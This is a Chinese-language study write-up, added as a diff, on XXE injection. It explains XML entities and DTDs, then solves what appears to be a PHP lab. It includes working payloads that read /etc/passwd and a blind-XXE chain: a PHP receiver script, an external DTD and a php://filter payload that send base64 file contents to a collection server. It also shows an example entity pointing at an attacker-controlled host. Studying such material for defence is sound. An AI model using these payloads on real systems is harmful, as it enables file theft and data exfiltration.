@@ -1,0 +1,167 @@
+---
+title: XXE 漏洞学习
+date: 2021-05-12 20:42:17
+tags: 
+     - web学习 
+categories:
+     - web学习 
+     - 学习
+
+
+
+---
+
+# XXE 漏洞学习
+
+## 原理
+
+XXE注入是一种Web安全漏洞，它使攻击者能够干扰应用程序处理XML数据的方式。成功利用漏洞可以使攻击者查看应用程序服务器中的文件，并与应用程序可以访问的任何外部或后端系统进行交互。
+
+### XML格式
+
+XML代表可扩展标记语言，它像HTML，有一个树状的标签和数据结构，但XML没有预定义的标记，如h1，img，div，等; 标签是根据其表示的数据自定义命名的。
+
+### XML实体
+
+XML实体是一种表示XML文档中的数据项的方式，而不是使用数据本身。将其视为编程中的变量。
+
+### 文件类型定义（DTD）
+
+它包含可以定义XML文档的结构，可以包含的数据值的类型以及其他项目的声明。DTD可以完全独立于XML文档中（称为内部DTD），也可以从其他位置加载（称为外部DTD）。DTD（DOCTYPE）在XML文档开头的元素内声明。
+
+```xml-dtd
+<!DOCTYPE name_for_doctype[ {some_data_here} ]>
+```
+
+### XML自定义实体
+
+自定义实体就像可以在DTD中创建的自定义变量。例如：<!DOCTYPE foo [ <!ENTITY myentity “my entity value" > ]>。这里对实体的任何引用&myentity;都将替换为数据“ my entitiy value"。因此，知道我们可以创建自定义实体后，便可以使用来自应用程序服务器的预定义数据来创建一个自定义实体。
+
+### XML外部实体
+
+XML外部实体是一种自定义实体，其定义位于声明它们的DTD之外。
+
+外部实体的声明使用SYSTEM关键字，并且必须指定一个URL，应从该URL加载实体的值。
+
+```xml-dtd
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM “http://attacker-controlled-site.com" > ]>
+```
+
+也可以使用其他协议，除了http如file。因此，我们可以从服务器/etc/passwd文件中提取数据。
+
+```xml-dtd
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM “file:///etc/passwd" > ]>
+```
+
+## DOMDocument.php
+
+![img](clip_image002.jpg)
+
+打开网页看到默认带了一段xml示例代码，这个DOCTYPE中已经有SYSTEM关键字，引用服务器的外部实体然后通过&content使用这个实体检索数据
+
+我们的payload可以写成
+
+```xml-dtd
+<?xml version="1.0"?>
+<!DOCTYPE PAYLOAD [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+  <payload>&xxe;</payload>
+```
+
+可以成功读取服务器的passwd文件
+
+![img](clip_image004.jpg)
+
+ 
+
+## SimpleXMLElement.php
+
+查看源码，发现只是把读取的函数换成`SimpleXMLElement($data, LIBXML_NOENT)`
+
+![img](clip_image006.jpg)
+
+发现原来的payload依然可以用
+
+![img](clip_image008.jpg)
+
+Payload为
+
+```xml-dtd
+<?xml version="1.0"?>
+<!DOCTYPE PAYLOAD [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+  <payload>&xxe;</payload>
+```
+
+
+
+## simplexml_load_string.php
+
+查看源码，发现也只改了读取xml的函数为$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT);
+
+![img](clip_image010.jpg)
+
+使用原来的payload依然可以读取到密码
+
+![img](clip_image012.jpg)
+
+Payload为
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE PAYLOAD [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+  <payload>&xxe;</payload> 
+```
+
+## BlindXXE.php
+
+打开网页，根据名字提示应该是xxe盲注，百度一下发现这个如果要远程执行需要一个公网ip（前3个都是在github远程环境进行实验），所以这次在本地实验。
+
+首先在需要接收密码的服务器端写一个PHP如下
+
+```PHP
+<?php
+$data = '';
+$file_name = "passwd.txt";
+$file_tmp = fopen($file_name,"a+");
+$data .= $_GET['xxe'];
+fwrite($file_tmp,$data);
+fclose($file_tmp); 
+?>
+```
+
+
+
+然后建立一个dtd文件内容如下
+
+```xml-dtd
+<!ENTITY % xxe "<!ENTITY &#x25; s SYSTEM 'http://127.0.0.1/phpaudit-XXE-master/1.php?xxe=%d;'> ">
+```
+
+最后payload如下
+
+```xml-dtd
+<?xml version="1.0"?>
+<!DOCTYPE test[
+  <!ENTITY % r SYSTEM "http://127.0.0.1/phpaudit-XXE-master/get.dtd">
+  <!ENTITY % d SYSTEM "php://filter/read=convert.base64-encode/resource=D:/phpstudy_pro/WWW/phpaudit-XXE-master/etc/passwd">
+  %r;
+  %s;
+]> 
+```
+
+效果如下
+
+![img](clip_image014.jpg)
+
+虽然页面会有报错，但是我们的远端服务器确实可以接收到passwd的base64编码
+
+![img](clip_image016.jpg)
+
+也可以进行解码出密码
+
+![img](clip_image018.jpg)
